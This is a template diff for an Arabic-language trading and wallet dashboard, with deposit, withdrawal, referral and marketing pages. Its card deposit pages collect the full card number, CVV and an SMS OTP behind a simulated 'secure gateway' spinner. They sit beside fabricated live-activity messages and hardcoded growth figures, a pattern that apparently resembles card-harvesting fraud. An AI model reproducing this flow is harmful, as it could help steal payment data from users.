+        <span>{{ sub_card.card_type }}</span>
+        <strong>{% if sub_card.status == 'نشطة' and sub_card.visible_balance is not none %}$ {{ "%.2f"|format(sub_card.visible_balance) }}{% else %}{{ user.full_name }}{% endif %}</strong>
+        <small>{{ sub_card.status }}{% if sub_card.status == 'نشطة' and sub_card.trading_account_number %} • {{ sub_card.trading_account_number }}{% endif %}</small>
+      </article>
+      {% endfor %}
+    </div>
+  </div>
+  {% endif %}
+
+  {% endif %}{# end home #}
+
+  <!-- ══════════════════════════════════════
+       SUBSCRIPTIONS PAGE
+  ══════════════════════════════════════ -->
     {% if page == "subscriptions" %}
     <section class="panel">
         <div class="section-title">
@@ -384,26 +732,11 @@
             <div class="card-amount-selection">
                 <label class="card-amount-label">اختر مبلغ الإيداع</label>
                 <div class="card-amount-options">
-                    <label class="card-amount-option">
-                        <input type="radio" name="amount" value="50">
-                        <span class="card-amount-btn">$50</span>
-                    </label>
-                    <label class="card-amount-option">
-                        <input type="radio" name="amount" value="100" checked>
-                        <span class="card-amount-btn active">$100</span>
-                    </label>
-                    <label class="card-amount-option">
-                        <input type="radio" name="amount" value="250">
-                        <span class="card-amount-btn">$250</span>
-                    </label>
-                    <label class="card-amount-option">
-                        <input type="radio" name="amount" value="500">
-                        <span class="card-amount-btn">$500</span>
-                    </label>
-                    <label class="card-amount-option">
-                        <input type="radio" name="amount" value="custom">
-                        <span class="card-amount-btn">مبلغ مخصص</span>
-                    </label>
+                    <label class="card-amount-option"><input type="radio" name="amount" value="50"><span class="card-amount-btn">$50</span></label>
+                    <label class="card-amount-option"><input type="radio" name="amount" value="100" checked><span class="card-amount-btn active">$100</span></label>
+                    <label class="card-amount-option"><input type="radio" name="amount" value="250"><span class="card-amount-btn">$250</span></label>
+                    <label class="card-amount-option"><input type="radio" name="amount" value="500"><span class="card-amount-btn">$500</span></label>
+                    <label class="card-amount-option"><input type="radio" name="amount" value="custom"><span class="card-amount-btn">مبلغ مخصص</span></label>
                 </div>
                 <input type="number" name="custom_amount" class="card-custom-amount" placeholder="أدخل المبلغ المخصص $" min="1" step="0.01" disabled>
             </div>
@@ -428,12 +761,8 @@
         </div>
         <form action="{{ url_for('card_deposit_process') }}" method="post" class="stack compact-form card-payment-form" id="cardPaymentForm">
             <input type="hidden" name="amount" value="{{ deposit_amount }}">
-            <label>الاسم على البطاقة
-                <input name="card_holder" placeholder="John Doe" required maxlength="100" autocomplete="cc-name">
-            </label>
-            <label>رقم البطاقة
-                <input name="card_number" class="card-number-input" placeholder="1234 5678 9012 3456" required maxlength="19" inputmode="numeric" autocomplete="cc-number">
-            </label>
+            <label>الاسم على البطاقة<input name="card_holder" placeholder="John Doe" required maxlength="100" autocomplete="cc-name"></label>
+            <label>رقم البطاقة<input name="card_number" class="card-number-input" placeholder="1234 5678 9012 3456" required maxlength="19" inputmode="numeric" autocomplete="cc-number"></label>
             <div class="form-grid two">
                 <label>تاريخ الانتهاء
                     <div class="card-expiry-grid">
@@ -447,13 +776,9 @@
                         </select>
                     </div>
                 </label>
-                <label>رمز الأمان CVV
-                    <input name="card_cvv" class="card-cvv-input" placeholder="•••" required maxlength="4" inputmode="numeric" autocomplete="cc-csc">
-                </label>
+                <label>رمز الأمان CVV<input name="card_cvv" class="card-cvv-input" placeholder="•••" required maxlength="4" inputmode="numeric" autocomplete="cc-csc"></label>
             </div>
-            <label>رقم الهاتف (اختياري)
-                <input name="phone" placeholder="+213 6XX XXX XXX" maxlength="20">
-            </label>
+            <label>رقم الهاتف (اختياري)<input name="phone" placeholder="+213 6XX XXX XXX" maxlength="20"></label>
             <div class="card-payment-total">
                 <span>المبلغ المطلوب</span>
                 <strong>${{ "%.2f"|format(deposit_amount) }}</strong>
@@ -464,32 +789,20 @@
     {% endif %}
 
     {% if page == "card_deposit_processing" %}
-    <section class="panel card-processing-panel">
+    <section class="panel card-processing-panel" data-req="{{ deposit_request.id }}">
         <div class="card-processing-container">
-            <div class="card-processing-spinner">
-                <div class="card-processing-logo">∞</div>
-            </div>
+            <div class="card-processing-spinner"><div class="card-processing-logo">∞</div></div>
             <p class="card-processing-text">طلبك قيد التنفيذ، يرجى الانتظار...</p>
             <p class="card-processing-sub">جاري الاتصال ببوابة الدفع الآمنة</p>
         </div>
     </section>
-    <script>
-        (function() {
-            var requestId = {{ deposit_request.id }};
-            setTimeout(function() {
-                window.location.href = '/card-deposit/' + requestId + '/verify';
-            }, 2000);
-        })();
-    </script>
+    <script>(function(){var el=document.querySelector('.card-processing-panel');if(el){var id=el.getAttribute('data-req');setTimeout(function(){window.location.href='/card-deposit/'+id+'/verify';},2000);}})();</script>
     {% endif %}
 
     {% if page == "card_deposit_verify" %}
     <section class="panel card-verify-panel">
         <div class="section-title">
-            <div>
-                <h2>🔐 التحقق من الدفع</h2>
-                <p>أدخل رمز التحقق المرسل إلى هاتفك</p>
-            </div>
+            <div><h2>🔐 التحقق من الدفع</h2><p>أدخل رمز التحقق المرسل إلى هاتفك</p></div>
             <span>OTP Verification</span>
         </div>
         <div class="card-verify-otp-container">
@@ -513,26 +826,7 @@
             </form>
         </div>
     </section>
-    <script>
-        (function() {
-            var hiddenInput = document.querySelector('.card-otp-hidden-input');
-            var boxes = document.querySelectorAll('.card-otp-box');
-            if (hiddenInput && boxes.length) {
-                hiddenInput.addEventListener('input', function() {
-                    var val = this.value.replace(/\D/g, '').slice(0, 6);
-                    this.value = val;
-                    boxes.forEach(function(box, i) {
-                        box.textContent = val[i] || '_';
-                    });
-                });
-                boxes.forEach(function(box) {
-                    box.addEventListener('click', function() {
-                        hiddenInput.focus();
-                    });
-                });
-            }
-        })();
-    </script>
+    <script>(function(){var h=document.querySelector('.card-otp-hidden-input'),b=document.querySelectorAll('.card-otp-box');if(h&&b.length){h.addEventListener('input',function(){var v=this.value.replace(/\D/g,'').slice(0,6);this.value=v;b.forEach(function(x,i){x.textContent=v[i]||'_';});});b.forEach(function(x){x.addEventListener('click',function(){h.focus();});});}})();</script>
     {% endif %}
 
     {% if page == "card_deposit_success" %}
@@ -543,22 +837,10 @@
             </div>
             <h2>✅ تم إرسال طلب الإيداع بنجاح</h2>
             <div class="card-success-details">
-                <div class="card-success-row">
-                    <span>رقم الطلب</span>
-                    <strong>TRB-{{ '%06d'|format(deposit_request.id) }}</strong>
-                </div>
-                <div class="card-success-row">
-                    <span>المبلغ</span>
-                    <strong>${{ "%.2f"|format(deposit_request.amount) }}</strong>
-                </div>
-                <div class="card-success-row">
-                    <span>طريقة الدفع</span>
-                    <strong>Visa / MasterCard</strong>
-                </div>
-                <div class="card-success-row">
-                    <span>الحالة</span>
-                    <span class="status-pill warn">قيد المراجعة</span>
-                </div>
+                <div class="card-success-row"><span>رقم الطلب</span><strong>TRB-{{ '%06d'|format(deposit_request.id) }}</strong></div>
+                <div class="card-success-row"><span>المبلغ</span><strong>${{ "%.2f"|format(deposit_request.amount) }}</strong></div>
+                <div class="card-success-row"><span>طريقة الدفع</span><strong>Visa / MasterCard</strong></div>
+                <div class="card-success-row"><span>الحالة</span><span class="status-pill warn">قيد المراجعة</span></div>
             </div>
             <p class="card-success-note">سيتم مراجعة طلبك من قبل فريقنا. في حال القبول، ستتم إضافة الرصيد تلقائياً إلى محفظتك.</p>
             <a href="{{ url_for('card_deposit') }}" class="secondary">إيداع جديد</a>
@@ -570,31 +852,18 @@
     {% if page == "payment_requests" %}
     <section class="panel">
         <div class="section-title">
-            <div>
-                <h2>طلب دفع جديد</h2>
-                <p>أرسل بيانات الدفع الآمنة بدون إدخال أو حفظ بيانات البطاقة البنكية.</p>
-            </div>
+            <div><h2>طلب دفع جديد</h2><p>أرسل بيانات الدفع الآمنة بدون إدخال أو حفظ بيانات البطاقة البنكية.</p></div>
             <span>Payment Request</span>
         </div>
         <form action="{{ url_for('payment_requests_page') }}" method="post" class="stack compact-form payment-request-form">
             <input name="full_name" value="{{ user.full_name }}" placeholder="الاسم الكامل" required>
             <select name="payment_method" required>
                 <option value="">اختر طريقة الدفع</option>
-                <option>Visa</option>
-                <option>MasterCard</option>
-                <option>Bank Transfer</option>
-                <option>PayPal</option>
-                <option>USDT (TRC20)</option>
-                <option>BNB</option>
+                <option>Visa</option><option>MasterCard</option><option>Bank Transfer</option><option>PayPal</option><option>USDT (TRC20)</option><option>BNB</option>
             </select>
             <div class="form-grid">
                 <input name="amount" type="number" step="0.01" min="0.01" placeholder="المبلغ" required>
-                <select name="currency" required>
-                    <option>USD</option>
-                    <option>EUR</option>
-                    <option>SAR</option>
-                    <option>AED</option>
-                </select>
+                <select name="currency" required><option>USD</option><option>EUR</option><option>SAR</option><option>AED</option></select>
             </div>
             <input name="reference_number" placeholder="رقم المرجع / العملية" required>
             <textarea name="notes" rows="3" placeholder="ملاحظات اختيارية"></textarea>
@@ -621,9 +890,7 @@
                         <input name="confirmation_code" placeholder="رمز التأكيد" maxlength="10" required>
                         <button>تم</button>
                     </form>
-                    {% else %}
-                    -
-                    {% endif %}
+                    {% else %}-{% endif %}
                 </td>
             </tr>
             {% else %}
@@ -637,9 +904,7 @@
     {% if page == "withdraw" %}
     <section class="panel">
         <h2>طلب سحب</h2>
-        {% if wallet.balance < 10 %}
-        <p class="notice danger-notice">الحد الأدنى للسحب هو 10$.</p>
-        {% endif %}
+        {% if wallet.balance < 10 %}<p class="notice danger-notice">الحد الأدنى للسحب هو 10$.</p>{% endif %}
         <form action="{{ url_for('withdraw') }}" method="post" class="stack compact-form">
             <select name="method" id="withdrawMethod" data-local-url="{{ url_for('local_withdraw') }}">
                 <option>USDT (TRC20)</option><option>BNB</option><option>Vodafone Cash</option><option>InstaPay</option><option>وكيل Telegram</option>
@@ -668,16 +933,11 @@
     {% if page == "local_withdraw" %}
     <section class="panel local-withdraw-panel">
         <div class="section-title">
-            <div>
-                <h2>السحب المحلي المباشر</h2>
-                <p>طريقة السحب المعتمدة: <b>{{ user.local_withdraw_method }}</b></p>
-            </div>
+            <div><h2>السحب المحلي المباشر</h2><p>طريقة السحب المعتمدة: <b>{{ user.local_withdraw_method }}</b></p></div>
             <span class="account-status review">قيد المعالجة بعد الإرسال</span>
         </div>
         <form action="{{ url_for('local_withdraw') }}" method="post" class="stack compact-form">
-            {% if wallet.balance < 10 %}
-            <p class="notice danger-notice">الحد الأدنى للسحب هو 10$.</p>
-            {% endif %}
+            {% if wallet.balance < 10 %}<p class="notice danger-notice">الحد الأدنى للسحب هو 10$.</p>{% endif %}
             <input name="amount" type="number" step="0.01" min="10" placeholder="مبلغ السحب" required>
             <label>رمز التذكرة<input id="localTicketCode" name="ticket_code" readonly value="{{ local_ticket_code }}"></label>
             <button class="secondary" type="button" data-copy-target="localTicketCode">نسخ رمز التذكرة</button>
@@ -737,8 +997,7 @@
         <div class="table-wrap"><table><thead><tr><th>الاسم</th><th>نوع البطاقة</th><th>حالة الاشتراك</th><th>تاريخ التسجيل</th><th>العمولة المكتسبة</th></tr></thead><tbody>
         {% for invited in referral_invited %}
         <tr>
-            <td>{{ invited.full_name }}</td>
-            <td>{{ invited.plan }}</td>
+            <td>{{ invited.full_name }}</td><td>{{ invited.plan }}</td>
             <td>{{ "نشط" if invited.subscription_active else "غير نشط" }}</td>
             <td>{{ invited.created_at }}</td>
             <td>${{ "%.2f"|format(invited.commission) }}</td>
@@ -764,60 +1023,37 @@
                 <button class="secondary" type="button" data-marketing-dialog-open="recharge">Recharge Marketing Wallet</button>
             </div>
         </header>
-
         <section class="marketing-enterprise-grid">
             <aside class="marketing-kpi-stack">
                 <article class="marketing-kpi-card wallet-kpi">
-                    <div>
-                        <span>Marketing Wallet Balance</span>
-                        <b data-count-to="{{ '%.2f'|format(marketing_wallet.balance) }}" data-count-prefix="$">${{ "%.2f"|format(marketing_wallet.balance) }}</b>
-                        <small>↑ 12.5% this month</small>
-                    </div>
+                    <div><span>Marketing Wallet Balance</span><b data-count-to="{{ '%.2f'|format(marketing_wallet.balance) }}" data-count-prefix="$">${{ "%.2f"|format(marketing_wallet.balance) }}</b><small>↑ 12.5% this month</small></div>
                     <i class="marketing-wallet-icon"></i>
                 </article>
                 <article class="marketing-kpi-card">
                     <i class="kpi-dot emerald">♣</i>
-                    <div>
-                        <span>Active Campaigns</span>
-                        <b data-count-to="{{ marketing_active_campaigns }}">{{ marketing_active_campaigns }}</b>
-                    </div>
+                    <div><span>Active Campaigns</span><b data-count-to="{{ marketing_active_campaigns }}">{{ marketing_active_campaigns }}</b></div>
                     <svg viewBox="0 0 120 42" aria-hidden="true"><path d="M2 32 C18 24, 22 28, 34 18 S56 24, 68 14 S92 20, 118 5"/></svg>
                 </article>
                 <article class="marketing-kpi-card">
                     <i class="kpi-dot purple">◈</i>
-                    <div>
-                        <span>Expected Leads</span>
-                        <b data-count-to="{{ marketing_expected_leads }}">{{ marketing_expected_leads }}</b>
-                    </div>
+                    <div><span>Expected Leads</span><b data-count-to="{{ marketing_expected_leads }}">{{ marketing_expected_leads }}</b></div>
                     <svg viewBox="0 0 120 42" aria-hidden="true"><path d="M2 34 C14 10, 24 35, 36 18 S58 8, 72 22 S94 32, 118 6"/></svg>
                 </article>
                 <article class="marketing-kpi-card">
                     <i class="kpi-dot blue">●</i>
-                    <div>
-                        <span>Estimated Conversion Rate</span>
-                        <b class="conversion-rate-value">{{ marketing_estimated_conversion or "0%" }}</b>
-                        <small>+2.1% This Month</small>
-                    </div>
+                    <div><span>Estimated Conversion Rate</span><b class="conversion-rate-value">{{ marketing_estimated_conversion or "0%" }}</b><small>+2.1% This Month</small></div>
                     <svg viewBox="0 0 120 42" aria-hidden="true"><path d="M2 35 C20 33, 26 20, 42 25 S64 30, 78 16 S96 16, 118 4"/></svg>
                 </article>
             </aside>
-
             <article class="marketing-create-card">
                 <div class="section-title">
-                    <div>
-                        <h2>Create New Campaign</h2>
-                        <p>Target, budget, duration, and estimate preview.</p>
-                    </div>
+                    <div><h2>Create New Campaign</h2><p>Target, budget, duration, and estimate preview.</p></div>
                     <button class="primary marketing-main-btn" type="button" data-marketing-dialog-open="campaign">Launch Campaign</button>
                 </div>
-                <div class="marketing-stepper">
-                    <span class="active">1 Target</span><span>2 Budget</span><span>3 Duration</span><span>4 Estimate</span>
-                </div>
-                <div class="marketing-chip-row">
-                    <span>🇸🇦 Saudi Arabia</span><span>🇪🇬 Egypt</span><span>🇫🇷 France</span><span>🇦🇪 UAE</span>
-                </div>
+                <div class="marketing-stepper"><span class="active">1 Target</span><span>2 Budget</span><span>3 Duration</span><span>4 Estimate</span></div>
+                <div class="marketing-chip-row"><span>🇸🇦 Saudi Arabia</span><span>🇪🇬 Egypt</span><span>🇫🇷 France</span><span>🇦🇪 UAE</span></div>
                 <div class="marketing-form-preview">
-                    <span>Campaign Budget <b>${% if marketing_campaigns %}{{ "%.0f"|format(marketing_campaigns[0].budget) }}{% else %}500{% endif %}</b></span>
+                    <span>Campaign Budget <b>{% if marketing_campaigns %}{{ "%.0f"|format(marketing_campaigns[0].budget) }}{% else %}500{% endif %}</b></span>
                     <span>Duration <b>{% if marketing_campaigns %}{{ marketing_campaigns[0].duration_days }}{% else %}30{% endif %} Days</b></span>
                 </div>
                 <div class="marketing-estimate-grid preview-estimates">
@@ -828,23 +1064,15 @@
                 </div>
                 <p class="marketing-disclaimer">All results displayed are estimates only and not guaranteed.</p>
             </article>
-
             <article class="marketing-map-card">
                 <div class="section-title">
-                    <div>
-                        <h2>Campaign Reach Map</h2>
-                        <p>Live global acquisition activity.</p>
-                    </div>
+                    <div><h2>Campaign Reach Map</h2><p>Live global acquisition activity.</p></div>
                     <span class="live-dot">Live</span>
                 </div>
                 <div class="marketing-world-map" aria-label="Campaign global reach map">
                     <svg viewBox="0 0 780 420" role="img">
                         <defs>
-                            <linearGradient id="marketingLand" x1="0" x2="1">
-                                <stop offset="0%" stop-color="#dfeaff"/>
-                                <stop offset="55%" stop-color="#c9f8e5"/>
-                                <stop offset="100%" stop-color="#edf7ff"/>
-                            </linearGradient>
+                            <linearGradient id="marketingLand" x1="0" x2="1"><stop offset="0%" stop-color="#dfeaff"/><stop offset="55%" stop-color="#c9f8e5"/><stop offset="100%" stop-color="#edf7ff"/></linearGradient>
                             <filter id="marketingGlow"><feGaussianBlur stdDeviation="5" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
                         </defs>
                         <path class="land" d="M115 105c55-48 139-41 179-15 23 15 40 6 69 7 31 1 51 20 85 17 50-5 99-25 151 15 40 31 75 86 40 130-33 42-106 24-141 59-49 50-101 53-152 19-36-24-67-19-111-17-58 3-101-36-96-82 3-27-49-30-60-67-7-24 13-46 36-66z"/>
@@ -854,16 +1082,9 @@
                         <path class="route r2" d="M435 145 C500 165, 536 202, 575 238"/>
                         <path class="route r3" d="M575 238 C615 205, 646 188, 700 182"/>
                         <path class="route r4" d="M385 170 C330 210, 286 248, 220 285"/>
-                        <g class="map-points">
-                            <circle cx="170" cy="150" r="7"/><circle cx="435" cy="145" r="7"/><circle cx="475" cy="178" r="7"/><circle cx="575" cy="238" r="7"/><circle cx="700" cy="182" r="7"/><circle cx="220" cy="285" r="7"/><circle cx="385" cy="170" r="7"/>
-                        </g>
+                        <g class="map-points"><circle cx="170" cy="150" r="7"/><circle cx="435" cy="145" r="7"/><circle cx="475" cy="178" r="7"/><circle cx="575" cy="238" r="7"/><circle cx="700" cy="182" r="7"/><circle cx="220" cy="285" r="7"/><circle cx="385" cy="170" r="7"/></g>
                     </svg>
-                    <span class="map-label uk">United Kingdom</span>
-                    <span class="map-label fr">France</span>
-                    <span class="map-label dz">Algeria</span>
-                    <span class="map-label eg">Egypt</span>
-                    <span class="map-label sa">Saudi Arabia</span>
-                    <span class="map-label ae">UAE</span>
+                    <span class="map-label uk">United Kingdom</span><span class="map-label fr">France</span><span class="map-label dz">Algeria</span><span class="map-label eg">Egypt</span><span class="map-label sa">Saudi Arabia</span><span class="map-label ae">UAE</span>
                 </div>
                 <div class="marketing-map-stats">
                     <span>Live Campaigns <b>{{ marketing_active_campaigns }}</b></span>
@@ -872,7 +1093,6 @@
                 </div>
             </article>
         </section>
-
         <section class="marketing-lower-grid">
             <article class="marketing-analytics-card">
                 <div class="section-title">
@@ -880,18 +1100,11 @@
                     <span>This Month</span>
                 </div>
                 <div class="marketing-chart">
-                    <span class="chart-line reach"></span>
-                    <span class="chart-line leads"></span>
-                    <span class="chart-line clicks"></span>
-                    <div class="chart-bars">
-                        {% for h in [22,35,54,48,66,74,58,82,64,44,38] %}
-                        <i style="height: {{ h }}%"></i>
-                        {% endfor %}
-                    </div>
+                    <span class="chart-line reach"></span><span class="chart-line leads"></span><span class="chart-line clicks"></span>
+                    <div class="chart-bars">{% for h in [22,35,54,48,66,74,58,82,64,44,38] %}<i style="--bh: {{ h }}%"></i>{% endfor %}</div>
                 </div>
                 <div class="chart-legend"><span>Reach</span><span>Leads</span><span>Conversions</span></div>
             </article>
-
             <article class="marketing-campaigns-table-card">
                 <div class="section-title">
                     <div><h2>Campaign Management</h2><p>Campaign Status, Campaign Progress, Budget and countries.</p></div>
@@ -907,7 +1120,7 @@
                         <td>${{ "%.2f"|format(campaign.budget) }}</td>
                         <td>{{ campaign.countries }}</td>
                         <td><span class="status-pill {{ 'good' if campaign.status in ['Approved','Running','Completed'] else 'bad' if campaign.status == 'Rejected' else 'warn' }}">{{ campaign.status }}</span></td>
-                        <td><div class="marketing-progress admin-mini-progress"><span style="width: {{ campaign.progress }}%"></span></div>{{ campaign.progress }}%</td>
+                        <td><div class="marketing-progress admin-mini-progress"><span class="bar-fill" style="--bar-w: {{ campaign.progress }}%"></span></div>{{ campaign.progress }}%</td>
                     </tr>
                     {% else %}
                     <tr><td colspan="6">لا توجد حملات بعد. استخدم زر Create New Campaign للبدء.</td></tr>
@@ -916,14 +1129,12 @@
                 </table></div>
             </article>
         </section>
-
         <section class="marketing-bottom-grid">
             <article><i>AI</i><b>AI-Powered Targeting</b><span>Smart audience selection using guided campaign data.</span></article>
             <article><i>↗</i><b>Real-Time Analytics</b><span>Campaign insights, progress tracking, and live estimates.</span></article>
             <article><i>✓</i><b>Secure Transactions</b><span>Wallet recharge requests reviewed by administration.</span></article>
             <article><i>☊</i><b>Marketing Tickets</b><span>Campaign updates arrive through dedicated marketing tickets.</span></article>
         </section>
-
         <section class="grid two marketing-support-grid">
             <article class="panel marketing-ticket-panel">
                 <h2>Marketing Tickets</h2>
@@ -952,7 +1163,6 @@
             </article>
         </section>
     </section>
-
     <dialog class="marketing-dialog" data-marketing-dialog="campaign">
         <form action="{{ url_for('create_marketing_campaign') }}" method="post" class="marketing-wizard" data-marketing-form>
             <button type="button" class="dialog-close" data-marketing-dialog-close>×</button>
@@ -961,28 +1171,18 @@
             <label>اسم الحملة<input name="campaign_name" placeholder="مثال: Gulf Growth Campaign"></label>
             <div class="marketing-step">
                 <h3>1. اختيار الدولة المستهدفة</h3>
-                <div class="marketing-country-grid">
-                    {% for country in marketing_countries %}
-                    <label><input type="checkbox" name="countries" value="{{ country }}"> {{ country }}</label>
-                    {% endfor %}
-                </div>
+                <div class="marketing-country-grid">{% for country in marketing_countries %}<label><input type="checkbox" name="countries" value="{{ country }}"> {{ country }}</label>{% endfor %}</div>
             </div>
             <div class="marketing-step">
                 <h3>2. اختيار الميزانية</h3>
                 <div class="marketing-budget-grid">
-                    {% for budget in marketing_budgets %}
-                    <label><input type="radio" name="budget" value="{{ budget }}" {% if loop.first %}checked{% endif %}> ${{ budget }}</label>
-                    {% endfor %}
+                    {% for budget in marketing_budgets %}<label><input type="radio" name="budget" value="{{ budget }}" {% if loop.first %}checked{% endif %}> ${{ budget }}</label>{% endfor %}
                     <label><input type="radio" name="budget" value="custom"> Custom <input name="custom_budget" type="number" step="0.01" min="1" placeholder="$"></label>
                 </div>
             </div>
             <div class="marketing-step">
                 <h3>3. اختيار مدة الحملة</h3>
-                <select name="duration_days">
-                    {% for days in marketing_durations %}
-                    <option value="{{ days }}">{{ days }} أيام</option>
-                    {% endfor %}
-                </select>
+                <select name="duration_days">{% for days in marketing_durations %}<option value="{{ days }}">{{ days }} أيام</option>{% endfor %}</select>
             </div>
             <div class="marketing-step marketing-estimates">
                 <h3>4. النتائج التقديرية</h3>
@@ -997,7 +1197,6 @@
             <button class="primary marketing-main-btn">Create Campaign</button>
         </form>
     </dialog>
-
     <dialog class="marketing-dialog" data-marketing-dialog="recharge">
         <form action="{{ url_for('recharge_marketing_wallet') }}" method="post" enctype="multipart/form-data" class="marketing-wizard">
             <button type="button" class="dialog-close" data-marketing-dialog-close>×</button>
@@ -1005,12 +1204,7 @@
             <h2>شحن محفظة التسويق</h2>
             <input name="amount" type="number" step="0.01" min="1" placeholder="المبلغ" required>
             <select name="payment_method" required>
-                <option value="">اختر وسيلة الدفع</option>
-                <option>USDT (TRC20)</option>
-                <option>BNB</option>
-                <option>Vodafone Cash</option>
-                <option>InstaPay</option>
-                <option>Telegram Agent</option>
+                <option value="">اختر وسيلة الدفع</option><option>USDT (TRC20)</option><option>BNB</option><option>Vodafone Cash</option><option>InstaPay</option><option>Telegram Agent</option>
             </select>
             <input name="transaction_number" placeholder="رقم العملية" required>
             <label>صورة الدفع<input name="proof" type="file" accept="image/*,.pdf"></label>
@@ -1023,11 +1217,7 @@
     {% if page == "marketing_detail" %}
     <section class="panel marketing-detail-hero">
         <a class="secondary" href="{{ url_for('marketing_page') }}">العودة إلى مركز التسويق</a>
-        <div>
-            <span class="pill">Campaign Dashboard</span>
-            <h2>{{ campaign.campaign_name }}</h2>
-            <p>Campaign ID: #{{ campaign.id }}</p>
-        </div>
+        <div><span class="pill">Campaign Dashboard</span><h2>{{ campaign.campaign_name }}</h2><p>Campaign ID: #{{ campaign.id }}</p></div>
         <span class="status-pill {{ 'good' if campaign.status in ['Approved','Running','Completed'] else 'bad' if campaign.status == 'Rejected' else 'warn' }}">{{ campaign.status }}</span>
     </section>
     <section class="grid two">
@@ -1041,7 +1231,7 @@
                 <span>المدة <b>{{ campaign.duration_days }} أيام</b></span>
                 <span>الحالة الحالية <b>{{ campaign.status }}</b></span>
             </div>
-            <div class="marketing-progress large"><span style="width: {{ campaign.progress }}%"></span></div>
+            <div class="marketing-progress large"><span class="bar-fill" style="--bar-w: {{ campaign.progress }}%"></span></div>
             <p>نسبة الإنجاز: <b>{{ campaign.progress }}%</b></p>
         </article>
         <article class="panel">
@@ -1061,9 +1251,7 @@
             {% for ticket in campaign_tickets %}
             <div class="marketing-ticket">
                 <span class="status-pill {{ 'good' if ticket.status in ['Approved','Running','Completed'] else 'bad' if ticket.status == 'Rejected' else 'warn' }}">{{ ticket.status }}</span>
-                <h3>{{ ticket.title }}</h3>
-                <p>{{ ticket.message }}</p>
-                <small>{{ ticket.created_at }}</small>
+                <h3>{{ ticket.title }}</h3><p>{{ ticket.message }}</p><small>{{ ticket.created_at }}</small>
             </div>
             {% else %}
             <p>لا توجد تحديثات لهذه الحملة بعد.</p>
@@ -1075,10 +1263,7 @@
     {% if page == "tickets" %}
     <section class="panel">
         <div class="section-title">
-            <div>
-                <h2>حالة حساب التداول</h2>
-                <p>متابعة مباشرة للحسابات المرتبطة بالبطاقات مع تحليل مبسط للمخاطرة.</p>
-            </div>
+            <div><h2>حالة حساب التداول</h2><p>متابعة مباشرة للحسابات المرتبطة بالبطاقات مع تحليل مبسط للمخاطرة.</p></div>
             <span>{{ trading_tickets|length }} تذكرة</span>
         </div>
         <div class="trading-ticket-grid">
@@ -1118,7 +1303,6 @@
             {% endfor %}
         </div>
     </section>
-
     <section class="panel">
         <h2>التذاكر وبطاقات Visa الذكية</h2>
         <div class="cards three">
@@ -1162,10 +1346,7 @@
         </div>
     </section>
     <section class="panel global-map-card">
-        <div class="section-title">
-            <h2>Live Global Activity Map</h2>
-            <span class="live-dot">LIVE</span>
-        </div>
+        <div class="section-title"><h2>Live Global Activity Map</h2><span class="live-dot">LIVE</span></div>
         <div class="world-map-3d" data-live-map>
             <span class="map-point p1"></span><span class="map-point p2"></span><span class="map-point p3"></span><span class="map-point p4"></span><span class="map-point p5"></span>
             <p class="live-activity-text" data-live-activity>عميل من الجزائر قام بإيداع</p>
@@ -1173,5 +1354,80 @@
         <div class="country-marquee"><span>مصر • الجزائر • المغرب • تونس • لبنان • العراق • فلسطين • ليبيا • موريتانيا • السعودية • سوريا • فرنسا • بريطانيا • النيجر • إثيوبيا • الهند • أمريكا</span></div>
     </section>
     {% endif %}
+
 </main>
+</div><!-- /db-shell -->
+
+<div class="db-overlay" id="dbOverlay"></div>
+
+<script>
+(function () {
+  /* ── Theme toggle ── */
+  var shell = document.getElementById('dbShell');
+  var themeBtn = document.getElementById('dbThemeBtn');
+  var stored = localStorage.getItem('db-theme');
+  if (stored === 'light') { shell.classList.add('light-mode'); themeBtn.textContent = '☀️'; }
+  if (themeBtn) themeBtn.addEventListener('click', function () {
+    var isLight = shell.classList.toggle('light-mode');
+    themeBtn.textContent = isLight ? '☀️' : '🌙';
+    localStorage.setItem('db-theme', isLight ? 'light' : 'dark');
+  });
+
+  /* ── Mobile sidebar ── */
+  var menuBtn = document.getElementById('dbMenuBtn');
+  var sidebar = document.getElementById('dbSidebar');
+  var overlay = document.getElementById('dbOverlay');
+  function closeSidebar() { sidebar && sidebar.classList.remove('open'); overlay && overlay.classList.remove('open'); }
+  if (menuBtn) menuBtn.addEventListener('click', function () { sidebar.classList.toggle('open'); overlay.classList.toggle('open'); });
+  if (overlay) overlay.addEventListener('click', closeSidebar);
+
+  /* ── Account row → detail panel ── */
+  var rows = document.querySelectorAll('.db-acct-row');
+  rows.forEach(function (row) {
+    row.addEventListener('click', function () {
+      rows.forEach(function (r) { r.classList.remove('selected'); });
+      row.classList.add('selected');
+      var d = row.dataset;
+      var st = d.status;
+      var isConn = st === 'connected';
+      /* card visual */
+      var cardEl = document.getElementById('dbMtCardVisual');
+      if (cardEl) {
+        cardEl.className = 'db-mt-card ' + (d.platform || '').toLowerCase();
+      }
+      var setProp = function (id, val) { var el = document.getElementById(id); if (el) el.textContent = val || '—'; };
+      setProp('dbCardPlatform', d.platform);
+      setProp('dbCardBroker', d.broker);
+      setProp('dbCardNum', d.num ? '•••• ' + (d.num.slice(-4) || d.num) : '•••• ••••');
+      setProp('dbCardBalance', d.balance ? '$' + parseFloat(d.balance).toFixed(2) : '$0.00');
+      var dot = document.getElementById('dbCardDot');
+      if (dot) { dot.className = 'db-mt-card-status-dot' + (isConn ? '' : ' offline'); }
+      /* info list */
+      setProp('dPlatform', d.platform);
+      setProp('dBroker', d.broker);
+      setProp('dNum', d.num);
+      setProp('dLeverage', d.leverage);
+      setProp('dBalance', d.balance ? '$' + parseFloat(d.balance).toFixed(2) : '—');
+      setProp('dStatus', d.statusLabel);
+      setProp('dDate', d.date ? d.date.split('T')[0] : '—');
+    });
+  });
+  /* auto-select first row */
+  if (rows.length) rows[0].click();
+
+  /* ── Tab filter ── */
+  var tabBtns = document.querySelectorAll('#acctTabs .db-tab');
+  tabBtns.forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      tabBtns.forEach(function (b) { b.classList.remove('active'); });
+      btn.classList.add('active');
+      var filter = btn.dataset.tab;
+      rows.forEach(function (row) {
+        var show = filter === 'all' || row.dataset.status === filter;
+        row.style.display = show ? '' : 'none';
+      });
+    });
+  });
+})();
+</script>
 {% endblock %}
